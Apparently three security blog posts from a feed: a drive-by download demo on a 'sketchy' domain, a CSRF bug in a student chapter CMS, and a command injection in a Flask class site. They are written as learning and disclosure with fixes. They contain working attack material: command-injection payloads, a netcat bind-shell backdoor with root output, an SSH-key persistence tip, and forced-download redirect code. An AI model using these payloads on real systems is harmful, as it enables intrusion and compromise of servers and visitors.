    <content type="html"><![CDATA[<p>Back in April, I won a free &ldquo;.club&rdquo; domain through gandi.net&rsquo;s
<a href="https://15.gandi.net">anniversary</a> prize giveaway. I really didn&rsquo;t need
a &ldquo;.club&rdquo; domain in particular, so I thought it would be pretty fun to
register a stereotypical &ldquo;sketchy&rdquo; domain and set it up as a drive-by
download site or something, because while I&rsquo;ve <em>heard</em> of doing this kind of
thing, I&rsquo;ve never actually done it before. Here&rsquo;s a blog post walking through
what I did. The usual disclaimer applies here: I did this purely for my
own education and learning experience and am not responsible for anything
you do with it.</p>

<h3>Step 1: Register your sketchy domain</h3>

<p>I chose <a href="http://freemoviedownload.club">http://freemoviedownload.club</a>.</p>

<h3>Step 2: Set up drive-by downloads</h3>

<p>This involves configuring your web server to automatically set the
<code>Content-Type</code> header of the resource you want to force download
to <code>application/octet-stream</code>. That should make most web browsers trigger
a download file prompt to actually download the file. Safari curiously
doesn&rsquo;t support prompts for downloaded file location like Chrome and Firefox,
so in that case, it will immediately download the file to <code>~/Downloads</code>.</p>

<p>I&rsquo;m going to try to force a drive-by download of a jpg file, so I added
the below config to my <code>.htaccess</code> file in Apache&rsquo;s <code>DocumentRoot</code>.</p>

<pre><code class="xml .htaccess">&lt;Files *.jpg&gt;
        ForceType application/octet-stream
&lt;/Files&gt;
</code></pre>

<p>That will force browers to download the image, rather than rendering it
when a browser tries to access <code>http://freemoviedownload.club/image.jpg</code>, for
example.</p>

<p>At this point, we&rsquo;re technically done. We can send someone a link to a file
and, assuming they say yes to the prompt (or use Safari), download it to their
computer.  But for some extra polish, I want to have an actual website with
content and have the download come from <em>that</em> page.</p>

<h3>Step 3: Redirect</h3>

<p>We can accomplish this with a trivial Javascript redirect that executes
after the page has loaded. We can even add a delay before the download happens
to give them time to read the website or whatever. The redirect will need
to be to the path configured in step 2, but this will give the illusion that
the download is coming from the <code>index.html</code> page.</p>

<p>&#8220;`html index.html
you have arrived at the official free movie download club! enjoy your download</p>

<script type="text/javascript" charset="utf-8">
    function f() { document.location = 'dickbutt.jpg' }
    setTimeout(f, 2000);
</script>


<p>&#8220;`</p>

<p>That&rsquo;s it! Anyone that browses to the website will automatically get a nice
&ldquo;dickbutt.jpg&rdquo; image downloaded to their machine. Again, particularly effective
against Safari and Chrome for Android, in my testing.</p>

    <content type="html"><![CDATA[<p><em>Exploiting a classic CSRF vulnerability</em></p>

<p>When I took over responsibility as the webmaster for
<a href="http://www.ieee.neu.edu">Northeastern University&rsquo;s IEEE student chapter</a> around
January 2014 (yes, this is a very belated post), I was suddenly reponsible for
maintaining a custom LAMP stack Content Management System (CMS) whose core
functionality was letting an admin post to a news feed on the front page of the
site.
This site has since been completely redone, but given that it is notoriously
difficult to program securely in PHP, I decided to poke around a little and
see if I could find any cool bugs.</p>

<p>Initially, I started looking for the most blatant web vulns, SQLi and XSS, but
was pleasantly surprised to find in the <code>register.php</code> file, for example, that
handles user registration, to find a input sanitation check.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newpassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])))</span>

    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
<span class="p">}</span></code></pre></div></p>

<p>This code has a pretty substantial blacklist of commonly used characters in
injections and operates by iterating over each character of the questionable
input and testing if the character is in the blacklist, if so, setting the
<code>$valid</code> variable to false. This seems to be an effective technique at ensuring
the input is safe to use, however OWASP tends to <a href="https://www.owasp.org/index.php/Data_Validation#Data_Validation_Strategies">discourage</a>
this model.</p>

<p>After ruling this out of potential vulns, I looked a little deeper into the code
that powered the posting of news to the website, <code>add-news.php</code>.</p>

<p>Here we can see that if the HTTP request is a &ldquo;POST&rdquo; and the PHP session variables
&ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
the code that adds news gets executed.</p>

ultimately a SQL query string is generated.</p>

<p>The important part to notice here is that there is no code that ensures the
legitimacy of the request, that is, that a currently authenticated admin
user actually meant to make this request. In this scenario if we can somehow
find a way to get the admin to
submit an arbitrary POST request to the <code>add-news.php</code> page, since she already
has the session all set up in her browser, we can bypass the session checks
previously shown and add arbitrary news to the website, for example.</p>

<p>You might be wondering how we can get the admin to submit arbitrary POST requests
without her noticing. The most obvious answer is physical access to the her
machine while she&rsquo;s away or something, but a much more realistic scenario
would be if we would get the admin
to browse to a web page that we (the attacker) control, we can use some nifty
JavaScript magic to get her to automatically submit the proper POST request
on our behalf.</p>

<p>This is called <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF">Cross Site Request Forgery</a>).</p>

<p>It turns out that these types of malicious pages are actually very simple
to write. Remember, all that&rsquo;s really needed is JavaScript execution, so
for example if you had previous knowledge of a site that the admin frequented
that had an XSS vulnerability, that would be a perfect way to chain these attacks.
Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="ni">&amp;lt;</span>!DOCTYPE HTML&gt;

    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></div></p>

<p>Nothing fancy here, just a simple hidden form with the values you want to submit
to the page, and some JS that submits the form.</p>

<p>A caveat: Yes, it is true that you would
have to guess the proper field names (&ldquo;posts&rdquo;, &ldquo;news_title&rdquo;) but even if you can
only guess &ldquo;posts&rdquo;, you can write anything into the body of the news post.</p>

<p>End result looks something like this.</p>

<p>There was an identical bug in the code that handles editing users. Let&rsquo;s
have some fun!</p>

<p><img src="/images/ieee_csrf2.gif" alt="" /></p>

<p>In both of these gifs, the admin user was logged in, and then they opened
a malicious html file, simulating visiting a malicious website. The mere act of
opening the web page triggered the payload which sent the POST to the server,
adding the news, and changing the user.</p>

<p>So how do we fix this sort of thing? The most common way involves the server
requiring a randomly generated, non-predictable token that is associated with
the user session with each request. An example could be that every time the
actual admin web interface form is loaded, it contains a hidden field, invisible
to the admin, with this token that is sent along with the request. The server
verifies that it sent this token out previously, and that the token hasn&rsquo;t expired,
and if everything else checks out, the request goes through.
This crucial missing piece of information will prevent attackers from
successfully faking requests as the authenticated user.</p>

    <content type="html"><![CDATA[<p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>

<h2>Introduction</h2>

<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>

<h2>Background</h2>

<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>

<h2>The Vulnerability</h2>

<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>

<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>

<pre><code class="python">def create(name, password):
    {...}
    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
</code></pre>

<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>

<pre><code class="python">def create_account():
    {...}
    name = request.form['create_username']
    pw = request.form['create_pw']
    {...}
    user.create(name, pw)
    {...}
</code></pre>

<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>

<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
</code></pre>

<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
</code></pre>

<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>

<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>

<h2>Patching</h2>

<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>

<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>

<pre><code class="python">import re
def valid_username(name):
    if re.search('[^\w.]', name):
        return False
    else
        return True
</code></pre>

<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>

<h3>Exploiting</h3>

<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>

<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>

<p>This command looks like</p>

<pre><code class="sh">$ netcat -l -p 1337 -e /bin/sh
</code></pre>

<p>and so our injection would look like</p>

<pre><code class="sh">mark; netcat -l -p 1337 -e /bin/sh &amp; #
</code></pre>

<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>

<pre><code>$ netcat [ip address] 1337
</code></pre>

<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>

<pre><code>$ netcat 1.2.3.4 1337

ls
imadeit.db
imadeit.py
schema.sql
static
templates
user.py
user.pyc

whoami
root

echo $SHELL
/bin/bash
</code></pre>

<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>

<h2>Conclusion</h2>

<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>

<p>That&rsquo;s all, thanks for reading!</p>
